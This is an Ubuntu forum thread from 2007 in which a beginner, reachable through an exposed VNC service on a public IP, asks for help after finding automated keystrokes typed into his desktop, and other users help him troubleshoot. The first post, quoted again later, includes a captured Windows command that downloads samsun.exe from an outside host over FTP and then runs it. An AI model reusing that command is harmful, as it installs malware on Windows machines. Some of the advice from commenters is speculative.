---
title: "Hack attempts"
date: 2007-12-20
forum: Absolute Beginner Talk
---

### Post by detroit/zero on 2007-12-20
So, I recently moved to a new apartment. I have internet access provided by a different carrier. I have my laptop connected through a wired connection, but the router is wireless and I do have a wireless card.

For the last three weeks, about four or five times a day, some idiot is trying to hack my computer. If I have any application open where keyboard input is accepted (such as text-search in Firefox, email, or even the search function in a nautilus window), I notice that this person is trying to work their magic.

Here's what I was able to capture of what he's inputing into my system. There might be some parts of the second line missing at the beginning, but it's obvious he's trying to get into a Windows machine. I have no idea what this command is supposed to be doing, but I'm glad I'm not using Windows because something tells me it wouldn't be pleasant. Here it is:

```
%systemroot% c:/windows/system32/cmd.exe
 echo open colinholo.ipower.com 21 >> ik &echo user fra fra >> ik &echo binary >> ik &echo get samsun.exe >> ik &echo bye >> ik &ftp -n -v -s:ik &del ik &samsun.exe &exit
```Now, here's the thing: I can't stop this fool from doing this three or more times a day.

I see nothing in the Events tab of Firestarter. The only ports I have open are for Deluge (6881-6889); everything else should be being blocked. I have file&printer sharing disabled. VNC, RDP, and SSH are all disabled, and the ports should be blocked through Firestarter.

I'm unable to capture any network data through Wireshark, because once he starts typing I can't do anything with any window I have open. With Wireshark, for example, I have to input a password in order to run it, and when he's typing that's what's being entered as my password.

Closing the BitTorrent ports in Firestarter has no effect; he's still able to get into my system. I've never seen this before, and I assume that my previous router (which I connected to wirelessly) had firewall settings that were blocking such attempts (or the WEP key). I also wonder if he's getting at me through my wireless card. I'm not sure that since I'm using eth0, ath0 is automatically disabled.

I'm ashamed to say I'm quite ignorant as to the ways of networking and such, and was hoping someone could give me some advice.

Let me know if I can provide any further info.

Thanks.

---

### Post by hyper_ch on 2007-12-20
The way I interprete this command is that he wants to use the cmd.exe on windows to establish a ftp connection (port 21) to the server/computer "colinholo.ipower.com" with the username "fra fra".
Then he tells that ftp connection to download the samsun.exe. That's probably some trojan, spyware, keylogger .... no clue... however I don't see a command where it should be tried to run/install that samsun.exe file. But then, I'm not a command line pro on windows.

---

### Post by christhemonkey on 2007-12-20
Doesnt the penultimate command run the samsun.exe?

---

### Post by hyper_ch on 2007-12-20
I think so, but I don't see it in the sequence posted by the TO.

---

### Post by Buffalo Soldier on 2007-12-20
Something similiar happened to this guy -> [http://ubuntuforums.org/showthread.php?t=593015](http://ubuntuforums.org/showthread.php?t=593015)

---

### Post by Arador Aristata on 2007-12-20
Samun.exe is spyware. The hacker is trying to get you to install it so he can do the rest. Since that wont work in Ubuntu, you are safe apart from the annoyance. On the other hand, the fact that he is getting in is a worry.

---

### Post by JillSwift on 2007-12-20
I'm no expert either - but I kind of doubt that the network is where that's coming from.

Does your laptop support bluetooth keyboards? If so, try turning it off and see if that shuts him out.

____ Edit:
Oh. It could be the network. See if you have a remote desktop connection open.

---

### Post by paul.matthijsse on 2007-12-20
Hello, I guess your router is new as well. Have you checked the firewall in the router (if any)? 

About Samsun.exe:
[http://spywarefiles.prevx.com/RRDFHD1625398/SAMSUN.EXE.html](http://spywarefiles.prevx.com/RRDFHD1625398/SAMSUN.EXE.html)

DEFINITION OF: SAMSUN.EXE

    * Safety Rating: Known Malware, do not run
    * Malware Family: Part of Malware group - Covert Sys Exec
    * Determination: Automatically determined using Prevx centralized heuristics
    * Malware Form: EXPLOIT

---

### Post by Rhubarb on 2007-12-20
You could try pressing Ctrl + Shift + Del in firefox, tell it to clear all of your Private data.
Also make sure your version of ubuntu is up to date (with the latest version of firefox 2.0.0.11)

---

### Post by GSF1200S on 2007-12-20
Enable logging on the router. Its obvious that hes getting in, so he is at least in the router and to your Ubuntu machine. The router will log all IP addresses incoming. Once you attain his IP, blacklist it. Now, it may not even be his IP- he may be using an alternate IP to protect himself. Considering he has tried multiple times, hes probably just spamming the crap, and isnt specifically attacking you. Blacklisting might take care of it.

It is disturbing that he managed to get in. It actually manages to stop Ubuntu from responding??

---

### Post by philinux on 2007-12-20
I'd check the routers firewall first. and make sure your wireless is secure.

---

### Post by zgornel on 2007-12-20
Just open wireshark and leave it to monitor all wireless trafic between your router and pc (you might get serveral MB's ). Then, search for the ip and mac address of the guy. The interesting fact is that he is able to capture the keyboard input... Another thing, the guy must be somewhere close to you, (to the router actually :D) You might try to spot him out and kick hiss asz.

---

### Post by detroit/zero on 2007-12-22
[LEFT]**WARNING - LONG WINDED UPDATE AHEAD**

OK, I've been away for a couple days, but given the time of year, I'm sure everybody understands. On to your advice:

*First, [JillSwift]("http://ubuntuforums.org/member.php?u=380445") writes:*
> I'm no expert either - but I kind of doubt that the network is where that's coming from.
 
Does your laptop support bluetooth keyboards? If so, try turning it off and see if that shuts him out.
Then, and this is the part I'll come back to:
>  ____ Edit:
Oh. It could be the network. See if you have a remote desktop connection open.Nope. No bluetooth here. I didn't even know until I tried connecting to my girlfriends cell phone, but that's a big negative on that one. Good idea, though..

*Second, [Rhubarb]("http://ubuntuforums.org/member.php?u=152122") writes:*
                                       > You could try pressing Ctrl + Shift + Del in firefox, tell it to clear all of your Private data.
 Also make sure your version of ubuntu is up to date (with the latest version of firefox 2.0.0.11)I'm actually using Swiftfox, but yes, that's the version listed. I'm actually quite fanatical about erasing data and such, installed the [Clear Private Data extension]("https://addons.mozilla.org/en-US/firefox/addon/1280"), and use it several times per browsing session. When it gets as easy as a couple mouse clicks, there's no excuse not to do it. Also, while I'm still using Feisty, I do run the system update every time it comes through (still a couple times a week).

*[GSF1200S]("http://ubuntuforums.org/member.php?u=261396") writes:*
                                                > Enable logging on the router. Its obvious that hes getting in, so he is at least in the router and to your Ubuntu machine. The router will log all IP addresses incoming. Once you attain his IP, blacklist it. Now, it may not even be his IP- he may be using an alternate IP to protect himself. Considering he has tried multiple times, hes probably just spamming the crap, and isnt specifically attacking you. Blacklisting might take care of it.

It is disturbing that he managed to get in. It actually manages to stop Ubuntu from responding??At my old place, that would have been the easy option, and I would have done that and avoided this thread altogether. At my old place, I had Yahoo DSL and a 2Wire DSL wireless router. It came with a CD of Windows software, but the important part was the 2Wire website where you could manage the computer connections, logging, etc, etc.  This cable company I'm using now does have such a site, but I'm now in Poland, and there's no button for English. Navigating by icons is time consuming but do-able, and has taught me a new phrase or two - especially "System Password Rejected". It's in my landlords name, and he has no idea what I or the people at the cable company are talking about when we talk about network passwords. So much for that idea.

I also don't think this person is singling me out. I imagine he has some sort of scanning software set up, and it seems to me that when these commands are being typed into my Swiftfox window or whatever email I'm writing at the time, that it's an automated script doing the typing - the keystrokes are very regularly spaced out and there's never ever a type-o. I have it timed out at once every four hours this joker is doing this, so that's six chances a day I have to observe the behavior and it **never** changes. (Side note: WiFi-Radar lists no less than 16 accessible wireless networks that have good signals within range of my laptop, 28 total.)

*[Zgornel]("http://ubuntuforums.org/member.php?u=168976") writes:*
> Just open wireshark and leave it to monitor all wireless trafic between your router and pc (you might get serveral MB's ). Then, search for the ip and mac address of the guy. The interesting fact is that he is able to capture the keyboard input... Another thing, the guy must be somewhere close to you, (to the router actually :grin:) You might try to spot him out and kick hiss asz.When I try to set *WireShark (as root)* to capture my wireless traffic (ath0), I'm greeted with this message:
[/LEFT]
[IMG]http://img148.imageshack.us/img148/79/screenshotwiresharkge9.png[/IMG]
[LEFT]which leads me to believe that the wireless adapter **is** disabled when I run on the wired connection (eth0). I did happen to notice, though, that the wireless switch on the laptop wasn't switched to the "off" position, but since I didn't see that (and correct it) until after I snapped that screenshot, I think it's OK.

And, believe me when I say that should I ever find this person, I will definitely "kick his asz", as you so eloquently put it :)

But now, back to [JillSwifts]("http://ubuntuforums.org/member.php?u=380445") statement:
>  ____ Edit:
 Oh. It could be the network. See if you have a remote desktop connection open.I was absolutely sure - 100% pure positive - that I had disabled everything. Everything. SSH. Remote desktop. VNCViewer. The works. The only allowed connection in Firestarter is for Deluge on the pre-set BitTorrent ports (6881-6889). No trusted hosts. Nothing.

[/LEFT]
 I always used VNCViewer, and I didn't think to check System>Preferences>Remote Desktop. So I did. This is what I saw:
[IMG]http://img214.imageshack.us/img214/5467/screenshotremotedesktopqu2.png[/IMG]
 Notice the checkbox next to "allow other users to control your desktop"? I tried clicking on it to disable it but it wouldn't change states, so I figured that without the one above it enabled, it wouldn't make any difference. Out of curiosity, I enabled the top box ("allow users to *view*...") and, lo and behold, I could change the checkbox. The same process is required for the bottom pair of boxes. I had a fairly weak password set (since at my old house the wireless routers' firewall/WEP key handled these problems) and this clown could have probably cracked it with a simple dictionary attack. 

I think that window is a little misleading. Offsetting/indenting the second option (control) under the first option (view) leads me to believe that the *View* option needs to be enabled for the *Control* option to have any effect. If this proves to be a little bug or oversight, it should definitely be reported to those with the coding know-how to fix it.

At any rate, this is what I now have:
[IMG]http://img521.imageshack.us/img521/8392/screenshotremotedesktopua7.png[/IMG]
I hope that those small oversights on my part prove to be the source of my problems. If not, as an experienced electronic technician, I'm going to go for a hardware approach: I'll open the wireless router and cut the antenna - after all, it's not mine and I don't use it. It's right next to my computer anyway, and I might still get a signal off it...

I'll keep this thread alive for any interested parties and post any results/changes in a few days.

Thanks for the ideas, folks.

---

### Post by aonegodman on 2007-12-23
WoW! This is some exciting stuff and quite educational.

I do appreciate you sharing your mystery.

Sounds like your hacker has some type off autobot scanning device set up with a preprogrammed script to search and try to capture unexpecting victims.

Did I hear you say you are in Poland?

That Wi-Fi Radar picked up multiple signals of access points in your area?

WoW, could be some government espionage or spying gong on.

Keep it coming please. Thanks. :popcorn:

---

### Post by odiseo77 on 2007-12-23
I once noticed on my logs, someone was trying to break into my PC in different ways (don't remember quite exactly, but I think he/she was sending pings repeatedly for about a week). So, what I did was to get the offending IP from my logs and check the ISP, then I contacted the ISP via e-mail complaining and explaining the situation (with detailed information about the type of attacks, the date and time, etc). After a few hours, the offending IP disappeared from my logs. 

So, if you know the IP address, you can issue the following command in a terminal: ***whois IP_address***. It will give you a lot of information, including the ISP abuse contact, probably, so you can e-mail the ISP complaining about the situation. 

However, the issue you describe is strange, since the attacker seems to have some type of access to your machine, but seems to believe it's a windows machine.

EDIT: I re-read the thread. If the attacker is getting to your home network by cracking your wireless router, then the above proceeding is unnecessary since you'd be getting an internal IP of your router, and not the attacker's IP/ISP...

---

### Post by detroit/zero on 2007-12-23
That's exactly the trouble I'm seeing. He's not showing up in any logs anywhere, so he's got his access to the trusted network via my wireless router.

I notice in my /etc/hosts file that **127.0.0.1** is listed as my machine, but under that is another line **127.0.1.1 MSHOME**. Since that's the network, should I delete that line? Or will doing so prevent me from having internet access?

All the things I wrote about in my big huge update had no effect on any of this - he still has the ability to get at my laptop. The only thing I haven't done is cut the antenna wire inside my router. That's next if I can't figure this out.

---

### Post by djfick on 2007-12-23
I know this is a silly question, but are you sure your laptop is connecting to your wireless signal and not another one?  Is your router using wep?  have you renamed your SSID and disabled the broadcast?  Have you tried to reconfigure your network with a different IP range?

---

### Post by sloggerkhan on 2007-12-23
2 things here. With firesatarter, when you click the 'lock firewall' button, does he still have access?

Also, have you tried using ntop or do you feel that it would fail to see his connection?
( and same with commands such as  sudo lsof -n -i -P  ? )

Also, in the Login Window preferences, maybe check what you have set for the security and remote tabs?

---

### Post by fatality_uk on 2007-12-23
A few steps!

1) Get into the 2wire web browser and change your password to a strong alpha numeric
2) Change your encryption to WPA. If your using WEP it can be broken
3) Change your IP address range. Usually if you

Ooops just re-read a little of your post and it seems that you don't have access to the English version of the 2Wire.

Dzie&#324; dobry. Gdzie mieszkasz? Warsaw?

I am actually flying to Poland on the 27th and if your in Warsaw, I could possibly help with a little translation, or even better, get my wife to do it :)

At it's core, you need to start from scratch on your router. If someone has got access to your router then the items above will lock em out.

Let me know if you have any joy. My brother-in-law is a network manager for Polish Telecom. Might be able to pull a few strings and do some monitoring :)

---

### Post by detroit/zero on 2007-12-23
[djflick]("http://ubuntuforums.org/member.php?u=376477") writes:
> I know this is a silly question, but are you sure your laptop is connecting to your wireless signal and not another one? Is your router using wep? have you renamed your SSID and disabled the broadcast? Have you tried to reconfigure your network with a different IP range?

I'm not connecting to any wireless connection. I have a wired connection from my router to my laptop. I have the wireless card switched off on the front of the computer, and as near as I can tell ath0 is disabled by Ubuntu when a wired connection is being used.

I don't know for 100% sure that the router uses WEP, but I assume it does because the couple times I tried to connect to it, it asked me for a WEP key. I know that certain manufacturers print the WEP key on a sticker on the bottom of the router, but I have no such luck. There are a few stickers with the serial number and mac address and such, but nothing resembling a 10-digit WEP key.

Renamed SSID? No. I don't think I even know how to do that. Reconfigure network with different IP range? I don't think I can do that without access to the router configuration, and I'm a little stuck on that at the moment. Disabled broadcasts? I think iptables/firestarter should be handling that for me:

[IMG]http://img57.imageshack.us/img57/182/screenshotpreferencesbc3.png[/IMG]

[IMG]http://img57.imageshack.us/img57/1535/screenshotpreferences1tu9.png[/IMG]

According to that, I shouldn't be receiving any ICMP packets or broadcasts from either the internal or external networks. How true it is, I don't know.

---

### Post by mellowd on 2007-12-23
> **zgornel said:**
> Just open wireshark and leave it to monitor all wireless trafic between your router and pc (you might get serveral MB's ). Then, search for the ip and mac address of the guy. The interesting fact is that he is able to capture the keyboard input... Another thing, the guy must be somewhere close to you, (to the router actually :D) You might try to spot him out and kick hiss asz.

You woudn't be able to get the MAC address of the user unless they are on the local network. Once you pass through layer 3 you'll get the MAC address of your layer 3 gateway, not the end uers' PC. Getting this IP should be no problem though.

---

### Post by High Roller on 2007-12-25
I was reading through the postings here and it seems like there might not be anyone "hacking" in via the network.  Sounds like somehow, somewhere, a script might have been picked up off of the web and is running on the PC.  Maybe some Java malware?

---

### Post by dnvikram on 2007-12-25
Yes,this seems to be handiwork of some cheapskate script kiddie who has downloaded some script from the web and automated it to run on a particular IP subnet and looks like your machine falls into that subnet and getting hit with that malware injection attempt.I would suggest ,you check your router settings thoroughly and check if packet forwarding is enabled and if so,what are the rules set currently.What is strange though,firestarter is not logging this in the event log.
One more thing,leave the current settings as it is and install nessusd and nessus client gui from the repositories.Once that is installed,run an extensive pen test on your machine (localhost) and check the results.It would be great if you could paste that output in this thread.Also run an nmap on your localhost and check the results and paste them here.Here is a great guide to nmap command  and its options.

[http://www.nmap-tutorial.com/pdf/nmap-tutorial.pdf](http://www.nmap-tutorial.com/pdf/nmap-tutorial.pdf)

---

### Post by detroit/zero on 2007-12-27
Gone for a couple days again. Christmas. You know the routine..

Anyways, to address a couple things:

[sloggerkahn]("http://ubuntuforums.org/member.php?u=176924") writes:
> 2 things here. With firesatarter, when you click the 'lock firewall' button, does he still have access?

Also, have you tried using ntop or do you feel that it would fail to see his connection?
( and same with commands such as  sudo lsof -n -i -P  ? )

Also, in the Login Window preferences, maybe check what you have set for the security and remote tabs?**Q1:** No. If I lock the firewall (or pull the plug out of the computer) he's gone.
**Q2:** I never heard of ntop until just now, but I've installed it and am reading up on how to use it.
**Q3:** I checked everything out. While I have remote login completely disabled on the Remote tab, one thing I did notice on the Security tab is the option "Deny TCP connections to Xserver," which I have enabled (thereby disabling access to X). It seems to me that this person has direct access to X, anyways, because this just doesn't happen in a Firefox window. It happens in emails, it happens in gedit.. if I'm watching a movie the player freaks out, if I'm using Nautilus I see what he's doing in the search bar.. if I try to open a WireShark-as-root window, his typing shows up in my enter-password-box. 

This isn't limited to my browser; it's system-wide. If he ever figures out he's up against a linux box, or one of his buddies gives him some pointers on what to do, I'm screwed *royally*.


[High Roller]("http://ubuntuforums.org/member.php?u=32791") writes:
> I was reading through the postings here and it seems like there might not be anyone "hacking" in via the network. Sounds like somehow, somewhere, a script might have been picked up off of the web and is running on the PC. Maybe some Java malware?After reading that I wondered if that might not be the case. But, as I was coming to the forum here to check on things, he made another attempt at my system. Pulling the network cable out of the computer halted his attempt. If it were a script running locally, wouldn't it just run no matter what?

[dnvikram]("http://ubuntuforums.org/member.php?u=297078") says:
> Yes,this seems to be handiwork of some cheapskate script kiddie who has downloaded some script from the web and automated it to run on a particular IP subnet and looks like your machine falls into that subnet and getting hit with that malware injection attempt.I would suggest ,you check your router settings thoroughly and check if packet forwarding is enabled and if so,what are the rules set currently.What is strange though,firestarter is not logging this in the event log.
One more thing,leave the current settings as it is and install nessusd and nessus client gui from the repositories.Once that is installed,run an extensive pen test on your machine (localhost) and check the results.It would be great if you could paste that output in this thread.Also run an nmap on your localhost and check the results and paste them here.Here is a great guide to nmap command and its options.Again, for those of you who say to check the router settings: I have no access to them. My landlord is a feeble old man who doesn't know what the password is. He had internet access put into the apartment because he figured he could charge more money for the room. I can't call the cable company and get them to change it since it's not my account, and the old man isn't interested in helping.

I did install nmap, though, and I'll look into the nessus thing. I need to read up on nmap in the tutorial link you provided, and I'll see what I can find on nessus. I'll get them installed and see what info I can get pasted into here for you guys to see.

That's all for now. Hope everyone had a Merry Christmas!

---

### Post by dburnett77 on 2007-12-27
A quick solution that should help:  Most routers are capable of MAC filtering.

This will allow you to set up only specific computers that can access the router.
You can also set the range of IP addresses to one (1).

The MAC address of your card in your laptop should be accessible through Network-Manager or something similar.  Get that, then log into your router (usually 192.168.nnn.nnn or something) and look around the menus for MAC filtering.

---

### Post by The Cog on 2007-12-27
Wireshark has an option to listen on a pseudo interface that llistans on all interfaces. This one may be worth a try. I would jush have to know how he's getting in if that were happening to me. 

And BTW, if you are connecting to the router over an Ethernet cable, anybody else accessing the router over wireless will also be appearing on your cable interface, not your wireless interface.

---

### Post by mellowd on 2007-12-27
> **The Cog said:**
> Wireshark has an option to listen on a pseudo interface that llistans on all interfaces. This one may be worth a try. I would jush have to know how he's getting in if that were happening to me. 

And BTW, if you are connecting to the router over an Ethernet cable, anybody else accessing the router over wireless will also be appearing on your cable interface, not your wireless interface.

No, they will show up as being connected via the wireless interface. It all depends though, some routers will simply show which clients are connected without any distinction between wireless and wired

---

### Post by psusi on 2007-12-27
To clarify, you have configured firestarter to block access to ALL incoming ports, disabled vnc, and this is still happening?

If so then you must have some sort of Trojan already installed which is really weird that you somehow got a Linux Trojan, yet the idiot is trying to install a windows Trojan using it.

I would suggest formatting and reinstalling.

---

### Post by Bigbluecat on 2007-12-27
Most routers come with a default password (like "password") and most users don't change them.  If you can find the make and model of the router you may be able to find the password with an internet search. Also if the default password is still in place then the router is very easy to gain access to and should be changed asap.

---

### Post by detroit/zero on 2007-12-27
Well, can somebody tell me how to access the routers configuration without going to the company web page? The one fellow said use "network manager" or something, but I have no such software installed (as far as I know)..

That would be the fastest solution to all of this if I could set that thing to run the way i want it to.

---

### Post by mellowd on 2007-12-27
> **detroit/zero said:**
> Well, can somebody tell me how to access the routers configuration without going to the company web page? The one fellow said use "network manager" or something, but I have no such software installed (as far as I know)..

That would be the fastest solution to all of this if I could set that thing to run the way i want it to.

enter the routers IP address in the address bar of firefox (usually 192.168.1.1 but could be different)

---

### Post by OffAxis on 2007-12-27
The most common addresses are 
192.168.1.1
and
192.168.0.1

What do you have?
```
ifconfig
```

will list your network card's ip and it will be a derivative of the dhcp server.
For example, if your's is 192.168.1.20 it will be on the 192.168.1.1 server.

---

### Post by detroit/zero on 2007-12-27
I hate to post info like this, but OK, check this out.. I think I may have found the issue:
```
~$ ifconfig
ath0      Link encap:Ethernet  HWaddr 00:1B:9E:0F:69:BC  
          inet6 addr: fe80::21b:9eff:fe0f:69bc/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:0 (0.0 b)  TX bytes:0 (0.0 b)

eth0      Link encap:Ethernet  HWaddr 00:16:D4:F7:F8:4D  
          inet addr:85.222.7.185  Bcast:85.222.7.255  Mask:255.255.252.0
          inet6 addr: fe80::216:d4ff:fef7:f84d/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:38785979 errors:0 dropped:0 overruns:0 frame:0
          TX packets:42598982 errors:0 dropped:2 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:3799636287 (3.5 GiB)  TX bytes:3091272723 (2.8 GiB)
          Interrupt:18 Base address:0xe000 

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:466200 errors:0 dropped:0 overruns:0 frame:0
          TX packets:466200 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:48935580 (46.6 MiB)  TX bytes:48935580 (46.6 MiB)

wifi0     Link encap:UNSPEC  HWaddr 00-1B-9E-0F-69-BC-00-00-00-00-00-00-00-00-00-00  
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:3613074 errors:0 dropped:1 overruns:0 frame:995844
          TX packets:109507 errors:83 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:199 
          RX bytes:315020788 (300.4 MiB)  TX bytes:5030986 (4.7 MiB)
          Interrupt:16 
```

**ath0..** zeros all around; that interface isn't being used, so it makes sense.
**eth0..** all kinds of activity. Makes sense to me.
**lo    .. **I have an extensive hosts file, so I'm surprised my loopback isn't more active, but OK with me...
**wifi0.. **? wifi0? Looks pretty darn active since I rebooted yesterday.

I had to think about it for a second. I remember when I first installed aircrack-ng, I was following a tutorial on how to use it and it said to create a pseudo-device for monitoring traffic (for educational purposes, of course).

I didn't think that thing would stay around.. How do I get rid of that?

Also, note that my IP isn't the usual 192.168.what.ever Not sure why that is...

---

### Post by rax_m on 2007-12-27
Hi there.. 

While I'm not networking expert, could it be that there is a trojan/spyware installed on some windows pc that is within your LAN. That pc is then sending out requests to any machine on the network... still not sure how it would get through your linux box though.. 

Hope you manage to solve this issue. It will be interesting to know what's the root cause. 

Cheers
Rax

---

### Post by psusi on 2007-12-27
You appear to have plugged the cable modem into a regular network port on the router instead of the wan port, so your router isn't routing and you're getting an IP direct from the ISP instead of the router.

---

### Post by detroit/zero on 2007-12-27
> You appear to have plugged the cable modem into a regular network port on the router instead of the wan port, so your router isn't routing and you're getting an IP direct from the ISP instead of the router
There's only one in  and one out on the back of this router. The cable in goes to the only BNC on the thing, and I'm connected into the only Cat5 plug on the thing that's clearly labeled "Ethernet 10/100". There are two ports labeled "telephone" but they have a sticker over them.

---

### Post by phr0ze on 2007-12-27
Yeah, thats a public IP, if you can, check the cables again. It should really help, this guy could be around the world. It does also seem to be a bit of wireless activity, but that could just be simple handshaking all day. 

So, rewire the router. Cable from the modem/wall goes into the WAN port. Cable from your PC goes into port 1-4. Reboot the router by turning it off/on.

If you don't use wireless, turn off the card. Sometimes there are switches, sometimes you can go into the bios and disable it, other times you can open the cover on the bottom of the laptop and remove the card or unplug the tiny antena wire.

Find the guy's IP and blacklist it. It'll help too. It's probably just a scripted hack that is scanning IP's all day. He probably doesn't switch the IP.

It's still concerning that the firewall in linux isn't stopping this from coming in. I doubt you have a linux trojan which would be the other way to get around a firewall.

good luck.

---

### Post by phr0ze on 2007-12-27
> **detroit/zero said:**
> There's only one in  and one out on the back of this router. The cable in goes to the only BNC on the thing, and I'm connected into the only Cat5 plug on the thing that's clearly labeled "Ethernet 10/100". There are two ports labeled "telephone" but they have a sticker over them.

Our post crossed paths. In this case, I'd say this is a modem and not a router. Go buy a proper router. They are cheap over here, hopefully they are cheap there too.

---

### Post by edm1 on 2007-12-27
So you're not using a wireless keyboard? Because that would make the most sense. It seems he is just taking control of your keyboard. Wierd. If this was the case though i assume he/she would have to be within a very close perimeter.

---

### Post by detroit/zero on 2007-12-27
I lent my girlfriend my camera, so I can't post a proper picture of the thing, but here is my best artists' rendition of what the thing looks like. Other than not being to scale, it's accurate:

[IMG]http://i150.photobucket.com/albums/s104/backup23/router.jpg[/IMG]

Yes, most likely a modem and not a router.

---

### Post by OffAxis on 2007-12-27
ya, that's not a private IP.
That block is registered to astercitynet in Warsaw.

The easiest thing is to install a router and use that as the firewall.
After you've got it installed you can check the router's logs and see what this guy's ip address is and blacklist it.
The next time he's logged on try entering the terminal command ```
w
```
it'll show you who's logged onto your machine.

By the way, nice drawing:).

---

### Post by bcom on 2007-12-27
Here a couple more thoughts on the subject:

1.  I think you are correct in assuming that this person is accessing your network via your wireless modem (I also agree with an earlier post that you might have a modem and not a router.)

2.  Remember, if he can access your network via the modem or router, it doesn't  matter if your own wireless card is enabled or not.  Once he gets on your network, he can access your computer via the wire.

3.  From the code you posted, it would work only on a Windows computer.  He is apparently trying to get get the machine to download a piece of spyware via FTP.

4.  In order for Firestarter to log activity on your computer, you must first create Policies.  Traffic will then be logged as it relates to these policies in Events.  It is not sufficient for logging just to configure Firestarter preferences.

5.  Also if you look again at the code you provided, he is trying to open an FTP port at colinholo.ipower.com.  ipower.com is a web hosting service and was web hosting for this turkey.  I say was because if you go point your browser at that web address you will get a message that this user has been shut down.   Perhaps your problem has been solved.

---

### Post by detroit/zero on 2007-12-27
>  The next time he's logged on try entering the terminal command

I can't type anything when he's doing his thing. Let me rephrase: I can still type things, but it's interspersed with his command. He's not taking over my keyboard, but it's like there's two keyboards working at the same time. I usually just hold down the backspace key so his crap gets erased as he types it.

One other thing I see here: I opened System> Administration> Network Tools and ran a portscan of my loopback address. Here's what I see:
[IMG]http://i150.photobucket.com/albums/s104/backup23/Screenshot-PortScan-NetworkTools.png[/IMG]
Why are these ports open? How can I close them? 6881 is for Deluge, and I always have that running, but as far as I know (and as far as firestarter says) that is the only set of whitelisted ports I have.

I notice that after this clown does his dirty work I check the logs and there is some microsoft-ds activity, but never ssh or anything else. Once in a while I see some netbios appearing there, but I don't think it's connected to my dilemma.

---

### Post by tech9 on 2007-12-27
> **detroit/zero said:**
> So, I recently moved to a new apartment. I have internet access provided by a different carrier. I have my laptop connected through a wired connection, but the router is wireless and I do have a wireless card.

For the last three weeks, about four or five times a day, some idiot is trying to hack my computer. If I have any application open where keyboard input is accepted (such as text-search in Firefox, email, or even the search function in a nautilus window), I notice that this person is trying to work their magic.

Here's what I was able to capture of what he's inputing into my system. There might be some parts of the second line missing at the beginning, but it's obvious he's trying to get into a Windows machine. I have no idea what this command is supposed to be doing, but I'm glad I'm not using Windows because something tells me it wouldn't be pleasant. Here it is:

```
%systemroot% c:/windows/system32/cmd.exe
 echo open colinholo.ipower.com 21 >> ik &echo user fra fra >> ik &echo binary >> ik &echo get samsun.exe >> ik &echo bye >> ik &ftp -n -v -s:ik &del ik &samsun.exe &exit
```Now, here's the thing: I can't stop this fool from doing this three or more times a day.

I see nothing in the Events tab of Firestarter. The only ports I have open are for Deluge (6881-6889); everything else should be being blocked. I have file&printer sharing disabled. VNC, RDP, and SSH are all disabled, and the ports should be blocked through Firestarter.

I'm unable to capture any network data through Wireshark, because once he starts typing I can't do anything with any window I have open. With Wireshark, for example, I have to input a password in order to run it, and when he's typing that's what's being entered as my password.

Closing the BitTorrent ports in Firestarter has no effect; he's still able to get into my system. I've never seen this before, and I assume that my previous router (which I connected to wirelessly) had firewall settings that were blocking such attempts (or the WEP key). I also wonder if he's getting at me through my wireless card. I'm not sure that since I'm using eth0, ath0 is automatically disabled.

I'm ashamed to say I'm quite ignorant as to the ways of networking and such, and was hoping someone could give me some advice.

Let me know if I can provide any further info.

Thanks.

My Advice:

buy a router with a built in firewall.
Change your password to a strong 8-12 digit alpha numeric password
looks like this character is trying to download some windows malware via ftp...
so if you are not using port 21 - close it
and last but not least...

(I know this is a stretch + a lot of work)
If you feel that your system has been compromised, which it very well could have...

Backup all of your data and reinstall your OS from scratch and restore your data

Good luck with blocking this idiot :)

---

### Post by dannyboy79 on 2007-12-27
try to change your hostname or netbios name. I am VERY SHOCKED that Firestarter isn't logging this activity if it's coming from the outside world. You do not have a Private IP address so the only thing blocking people is Firestarter (iptables). I myself have never trusted firestarter. I either use a bash script that sets up iptables properly or I would buy a  Hardware Firewall that has NAT and SPI. Have you checked out 

/var/log/auth.log?

What does netstat -pant return?

This should show you all the port numbers that are listening. Any that have 0.0.0.0:21 would be listening to outside requests. If it's 127.0.0.1:21 than it's only listening to the loopback and that's ok. My example is port 21, FTP port. Are you sure you don't have SAMBA listening to outside requests?

Have you done a search for samsun.exe on your machine yet?

sudo find / -name samsun.exe

Good luck and keep us informed. This is very misterious

---

### Post by detroit/zero on 2007-12-27
>  What does netstat -pant return?

This should show you all the port numbers that are listening. Any that have 0.0.0.0:21 would be listening to outside requests. If it's 127.0.0.1:21 than it's only listening to the loopback and that's ok. My example is port 21, FTP port. Are you sure you don't have SAMBA listening to outside requests?

Here is the output from that command:
```
~$ netstat -pant 
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name   
tcp        0      0 0.0.0.0:6881            0.0.0.0:*               LISTEN     6661/python         
tcp        0      0 85.222.7.185:6881       220.71.81.138:2146      SYN_RECV   -                   
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN     -                   
tcp        0      0 0.0.0.0:5900            0.0.0.0:*               LISTEN     -                   
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN     -                   
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN     -                   
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN     -                   
tcp        0      0 85.222.7.185:37270      84.81.127.75:61844      ESTABLISHED6661/python         
tcp        0      0 85.222.7.185:53337      189.6.255.150:55007     ESTABLISHED6661/python         
tcp        0     60 85.222.7.185:57367      83.102.69.96:9686       ESTABLISHED6661/python         
tcp        0     17 85.222.7.185:6881       207.216.200.63:62272    ESTABLISHED6661/python         
tcp        0  14834 85.222.7.185:6881       85.224.103.97:1926      ESTABLISHED6661/python         
tcp        0      0 85.222.7.185:54516      201.13.146.232:47587    ESTABLISHED6661/python         
tcp        0      0 85.222.7.185:6881       220.71.81.138:1728      ESTABLISHED6661/python         
